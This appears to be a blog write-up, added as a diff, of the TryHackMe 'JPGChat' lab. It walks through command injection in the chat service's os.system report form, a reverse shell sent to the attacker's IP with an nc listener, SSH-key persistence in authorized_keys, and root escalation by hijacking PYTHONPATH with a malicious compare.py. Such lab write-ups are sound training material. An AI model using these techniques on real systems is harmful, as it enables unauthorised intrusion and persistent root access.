@@ -1,0 +1,208 @@
+<p>Link to the ctf: <a href="https://tryhackme.com/room/jpgchat">JPGChat</a></p>
+
+<h1 id="initial-foothold">Initial foothold.</h1>
+<p>This was a little tricky because the service at the port <code class="highlighter-rouge">3000</code> was not responding properly. So I was stuck with <code class="highlighter-rouge">rustscan</code>.
+But <code class="highlighter-rouge">nmap</code> tried several times until the port answered.</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>nmap -sV -sC -p- -T5 -vv -oN nmap.log 10.10.148.90
+</code></pre></div>
+
+<div class="highlighter-rouge"><pre class="codehilite"><code>Warning: 10.10.148.90 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.148.90
+Host is up, received echo-reply ttl 63 (0.077s latency).
+Scanned at 2021-03-01 06:29:57 CET for 298s
+Not shown: 65533 closed ports
+Reason: 65533 resets
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqRxJhw/1rrvXuEkXF+agfTYMZrCisS01Z9EWAv8j6Cxjd00jBeaTGD/OsyuWUGwIqC0duALIIccwQfG2DjyrJCIPYyXyRiTbTSbqe07wX6qnnxV4xBmKdu8SxVlPKqVN36gQtbHWQqk9M45sej0M3Qz2q5ucrQVgWsjxYflYI1GZg7DSuWbI9/GNJPugt96uxupK0pJiJXNG26sM+w0BdF/DHlWFxG0Z+2CMqSlNt4EA2hlgBWKzGxvKbznJsapdtrAvKxBF6WOfz/FdLMQa7f28UOSs2NnUDrpz8Xhdqz2fj8RiV+gnywm8rkIzT8FOcMTGfsvOHoR8lVFvp5mj
+|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2CCqg8ac3eDsePDO27TM9OweWbaqytzrMyj+RbwDCHaAmfvhbA0CqTGdTIBAsVG6ect+OlqwgOvmTewS9ihB8=
+|   256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIXcEOgRyLk02uwr8mYrmAmFsUGPSUw1MHEDeH5qmcxv
+3000/tcp open  ppp?    syn-ack ttl 63
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     Welcome to JPChat
+|     source code of this service can be found at our admin's github
+|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.80%I=7%D=3/1%Time=603C7CFC%P=x86_64-redhat-linux-gnu%r
+SF:(NULL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\
+SF:x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMES
+SF:SAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(curre
+SF:ntly\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\
+SF:x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(
+SF:GenericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x
+SF:20this\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20gith
+SF:ub\nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20
+SF:\(currently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]
+SF:\x20to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)
+SF:\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar  1 06:34:55 2021 -- 1 IP address (1 host up) scanned in 298.59 seconds
+</code></pre></div>
+
+<p>The <code class="highlighter-rouge">3000</code> port ansers with this message:</p>
+<div class="highlighter-rouge"><pre class="codehilite"><code>Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+</code></pre></div>
+<p>(Let’s keep in mind the following sentence: <code class="highlighter-rouge">the source code of this service can be found at our admin's github</code>)</p>
+
+<p>I thought it was an http service but apparently I had to use <code class="highlighter-rouge">nc</code> to send commands</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>nc 10.10.148.90 3000
+</code></pre></div>
+<p><img src="/assets/Clipboard_2021-03-01-07-06-19.png" alt="" />
+By writing <code class="highlighter-rouge">[REPORT]</code> and sending enter, we find one of the admin’s name: <code class="highlighter-rouge">Mozzie-jpg</code>.</p>
+
+<p><img src="/assets/Clipboard_2021-03-01-07-06-19.png" alt="" /></p>
+
+<p>So I headed myself to github and wrote <code class="highlighter-rouge">Mozzie-jpg</code>
+<img src="/assets/Clipboard_2021-03-01-07-08-23.png" alt="" /></p>
+<blockquote>
+  <p>We’re gonna ignore the first result because it’s another writeup. :’)
+The source code can be found at <a href="https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py">https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py</a></p>
+</blockquote>
+
+<div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#!/usr/bin/env python3</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">print</span> <span class="p">(</span><span class="s">'Welcome to JPChat'</span><span class="p">)</span>
+<span class="k">print</span> <span class="p">(</span><span class="s">'the source code of this service can be found at our admin</span><span class="se">\'</span><span class="s">s github'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">report_form</span><span class="p">():</span>
+
+	<span class="k">print</span> <span class="p">(</span><span class="s">'this report will be read by Mozzie-jpg'</span><span class="p">)</span>
+	<span class="n">your_name</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'your name:</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+	<span class="n">report_text</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'your report:</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'echo </span><span class="si">%</span><span class="s">s &gt; /opt/jpchat/logs/report.txt'"</span> <span class="o">%</span> <span class="n">your_name</span><span class="p">)</span>
+	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'echo </span><span class="si">%</span><span class="s">s &gt;&gt; /opt/jpchat/logs/report.txt'"</span> <span class="o">%</span> <span class="n">report_text</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">chatting_service</span><span class="p">():</span>
+
+	<span class="k">print</span> <span class="p">(</span><span class="s">'MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel'</span><span class="p">)</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">'REPORT USAGE: use [REPORT] to report someone to the admins (with proof)'</span><span class="p">)</span>
+	<span class="n">message</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">message</span> <span class="o">==</span> <span class="s">'[REPORT]'</span><span class="p">:</span>
+		<span class="n">report_form</span><span class="p">()</span>
+	<span class="k">if</span> <span class="n">message</span> <span class="o">==</span> <span class="s">'[MESSAGE]'</span><span class="p">:</span>
+		<span class="k">print</span> <span class="p">(</span><span class="s">'There are currently 0 other users logged in'</span><span class="p">)</span>
+		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+			<span class="n">message2</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'[MESSAGE]: '</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">message2</span> <span class="o">==</span> <span class="s">'[REPORT]'</span><span class="p">:</span>
+				<span class="n">report_form</span><span class="p">()</span>
+
+<span class="n">chatting_service</span><span class="p">()</span>
+</code></pre></div>
+<p>What we notice in particular is the <code class="highlighter-rouge">report_form</code> function.
+There are two lines where the script calls bash to execute a command.</p>
+<div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'echo </span><span class="si">%</span><span class="s">s &gt; /opt/jpchat/logs/report.txt'"</span> <span class="o">%</span> <span class="n">your_name</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'echo </span><span class="si">%</span><span class="s">s &gt;&gt; /opt/jpchat/logs/report.txt'"</span> <span class="o">%</span> <span class="n">report_text</span><span class="p">)</span>
+</code></pre></div>
+<p>Apparently, we can perform an RCE by just injecting our command as <code class="highlighter-rouge">your_name</code> and/or as <code class="highlighter-rouge">report_text</code> since those two are input that we can control</p>
+
+<p>We are able to inject our command right where the <code class="highlighter-rouge">%s</code> stands.</p>
+
+<p>So one thing that we can do is to supply to <code class="highlighter-rouge">echo</code> a word (even a letter, whatever it is), insert a semicolon, write our payload and then use <code class="highlighter-rouge">#</code> to comment everything else after our payload.
+So the whole command will look like this: <code class="highlighter-rouge">something; &lt;payload&gt; #</code></p>
+
+<p>I used <a href="https://github.com/jackrendor/asio">asio</a> to generate a reverse shell.</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>asio -H MY_IP -P 8080 -A -B
+</code></pre></div>
+<p>In this way, <code class="highlighter-rouge">asio</code> generates a one-liner that’s gonna try different payloads.</p>
+
+<p><img src="/assets/Clipboard_2021-03-01-07-18-22.png" alt="" /></p>
+<blockquote>
+  <p>Indeed, that’s a long payload</p>
+</blockquote>
+
+<p>and we’re gonna open up our listener</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>rlwrap nc -vlp 8080
+</code></pre></div>
+
+<p>and then we’re gonna insert our payload as we previously discussed.
+<img src="/assets/Clipboard_2021-03-01-07-21-31.png" alt="" /></p>
+
+<p>To be sure, I did this for both of <code class="highlighter-rouge">your_name</code> and <code class="highlighter-rouge">report_text</code> fields.
+<img src="/assets/Clipboard_2021-03-01-07-26-28.png" alt="" />
+And we got our reverese shell.
+If we perform a <code class="highlighter-rouge">whoami</code>, we can see that we’re the user <code class="highlighter-rouge">wes</code>.
+The next step is to upgrade to a better shell. We can easly create a ssh-key by issuing the following command on our machine:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>ssh-keygen -t ecdsa -N <span class="s1">''</span> <span class="s1">''</span> -f wes
+</code></pre></div>
+
+<p>and put the content of <code class="highlighter-rouge">wes.pub</code> inside the victim machine in <code class="highlighter-rouge">/home/wes/.ssh/authorized_keys</code></p>
+
+<p>if the folder <code class="highlighter-rouge">.ssh</code> doesn’t exist, create it.</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code><span class="nb">echo</span> <span class="s2">"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCR/VjkHMmpgmgKeuZrSX10wxCDp9ML34CEqvZjkEcy/5IusFxFpm8ECp2Sn2sPz9a5W6FB0YfvjmJnI2wxvtE= jackrendor"</span> &gt; /home/wes/.ssh/authorized_keys
+</code></pre></div>
+
+<p>now we can log in via ssh by issuing the followin command:</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>ssh -i wes wes@10.10.148.90
+</code></pre></div>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>By issuing <code class="highlighter-rouge">sudo -l</code> we can see which commands we can execute as root and some other useful information.</p>
+<div class="highlighter-rouge"><pre class="codehilite"><code>Matching Defaults entries for wes on ubuntu-xenial:
+    mail_badpass, env_keep+=PYTHONPATH
+
+User wes may run the following commands on ubuntu-xenial:
+    (root) SETENV: NOPASSWD: /usr/bin/python3
+        /opt/development/test_module.py
+</code></pre></div>
+<p>We can potentially execute the following script: <code class="highlighter-rouge">/opt/development/test_module.py</code>.</p>
+
+<p>This is the content of the script:</p>
+<div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#!/usr/bin/env python3</span>
+
+<span class="kn">from</span> <span class="nn">compare</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">compare</span><span class="o">.</span><span class="n">Str</span><span class="p">(</span><span class="s">'hello'</span><span class="p">,</span> <span class="s">'hello'</span><span class="p">,</span> <span class="s">'hello'</span><span class="p">))</span>
+</code></pre></div>
+
+<p>Some context here:
+We have <code class="highlighter-rouge">env_keep+=PYTHONPATH</code> which allows us to add other paths where python can find the libraries.</p>
+
+<p>and the scripts imports <code class="highlighter-rouge">compare</code> as libary.
+We can create a new script in our home folder called <code class="highlighter-rouge">compare.py</code></p>
+
+<p>And then try to mimic the function <code class="highlighter-rouge">compare.Str</code>.
+In our new libary, we call <code class="highlighter-rouge">os.system</code> and we try to write our ssh-key to <code class="highlighter-rouge">/root/.ssh/authorized_keys</code>.</p>
+<blockquote>
+  <p>NOTE: I’m using the same public key as <code class="highlighter-rouge">wes</code>, you could create another key if you want to, but I preferred to not to.</p>
+</blockquote>
+
+<div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="k">class</span> <span class="nc">compare</span><span class="p">:</span>
+  <span class="k">def</span> <span class="nf">Str</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">,</span> <span class="n">s3</span><span class="p">):</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mkdir /root/.ssh; echo ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCR/VjkHMmpgmgKeuZrSX10wxCDp9ML34CEqvZjkEcy/5IusFxFpm8ECp2Sn2sPz9a5W6FB0YfvjmJnI2wxvtE= jackrendor &gt;&gt; /root/.ssh/authorized_keys"</span><span class="p">)</span>
+</code></pre></div>
+<p>Now, we have to change hte <code class="highlighter-rouge">PYTHONPATH</code> env. In this way, python will look up for the library in our directory.</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code><span class="nb">export </span><span class="nv">PYTHONPATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PYTHONPATH</span>
+</code></pre></div>
+<p>Now we execute the python script with sudo:</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>sudo /usr/bin/python3 /opt/development/test_module.py
+</code></pre></div>
+<p>We can see some strange output:</p>
+<div class="highlighter-rouge"><pre class="codehilite"><code>mkdir: cannot create directory ‘/root/.ssh’: File exists
+None
+</code></pre></div>
+<p>But it doesn’t matter that <code class="highlighter-rouge">mkdir</code> failed, because it actually wrote the ssh key in the <code class="highlighter-rouge">/root/.ssh/authoridez_keys</code> because otherwise we would’ve get another error.</p>
+
+<p>Now, on our machine, we can once again use ssh but this time we’re gonna use the username <code class="highlighter-rouge">root</code>. Same as we did before.</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>ssh -i wes root@10.10.148.90
+</code></pre></div>
+
+<p><img src="/assets/Clipboard_2021-03-01-08-23-30.png" alt="" /></p>
